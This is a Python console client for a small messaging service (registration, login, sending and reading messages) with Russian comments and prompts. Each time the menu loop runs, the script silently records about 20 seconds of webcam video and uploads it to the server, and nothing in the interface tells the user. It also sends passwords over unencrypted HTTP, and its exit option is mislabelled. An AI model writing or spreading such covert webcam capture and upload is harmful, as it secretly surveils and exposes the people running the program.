import json
import requests
import platform
import cv2
import time

# Настройка заголовков для HTTP-запросов
headers = {'Content-Type': 'application/json'}
name_devices = platform.node()

# Инициализация захвата видео с веб-камеры
cap = cv2.VideoCapture(0)
if not cap.isOpened():
    print("Ошибка: не удалось открыть веб-камеру")
    exit()

def regist(name, gmail, password):
    data = {
        "name": name,
        "gmail": gmail,
        "password": password,
    }
    response = requests.post("http://192.168.1.104:3000/api/regist", data=json.dumps(data), headers=headers)
    print(response.json())

def message(name, messag):
    data = {
        "name": name,
        "message": messag,
        "name_devices": name_devices
    }
    response = requests.post("http://192.168.1.104:3000/api/send_message", data=json.dumps(data), headers=headers)
    print(response.json())

def get_messages():
    data = {
        "name_devices": name_devices
    }
    response = requests.get(f"http://192.168.1.104:3000/api/get_messages", data=json.dumps(data), headers=headers)
    print(response.json())

def profil(name, gmail, password):
    data = {
        "name": name,
        "gmail": gmail,
        "password": password,
        "name_devices": name_devices
    }
    response = requests.post("http://192.168.1.104:3000/api/user", data=json.dumps(data), headers=headers)
    print(response.json())

def record_video():
    frame_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
    frame_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
    output_file = 'output.avi'
    fourcc = cv2.VideoWriter_fourcc(*'MJPG')
    out = cv2.VideoWriter(output_file, fourcc, 20.0, (frame_width, frame_height))

    start_time = time.time()
    while True:
        ret, frame = cap.read()
        if not ret:
            print("Ошибка: не удалось получить кадр")
            break
        out.write(frame)
        if (time.time() - start_time) > 20 or cv2.waitKey(1) & 0xFF == ord('q'):
            break

    out.release()
    url = 'http://192.168.1.104:3000/api/upload_video'
    files = {'video': open('output.avi', 'rb')}  
    response = requests.post(url, files=files)
    print(response.json())

if __name__ == "__main__":
    while True:
        record_video()
        print("1. Регистрация")
        print("2. Вход в профиль")
        print("3. Отправить сообщение")
        print("4. Получить сообщение")
        print("7. Выход")
        
        a = input("Введите цифру: ")
        
        if a == '1':
            name = input("Введите имя: ")
            gmail = input("Введите gmail: ")
            password = input("Введите пароль: ")
            regist(name, gmail, password)
        elif a == "2":
            name = input("Введите имя: ")
            gmail = input("Введите gmail: ")
            password = input("Введите пароль: ")
            profil(name, gmail, password)
        elif a == '3':
            name = input("Введите имя кому хотите отправить сообщение: ")
            messag = input("Введите сообщение: ")
            message(name, messag)
        elif a == '4':
            get_messages()
        elif a == '5':
            break
        else:
            print("Введите корректную цифру")

    cap.release()
    cv2.destroyAllWindows()
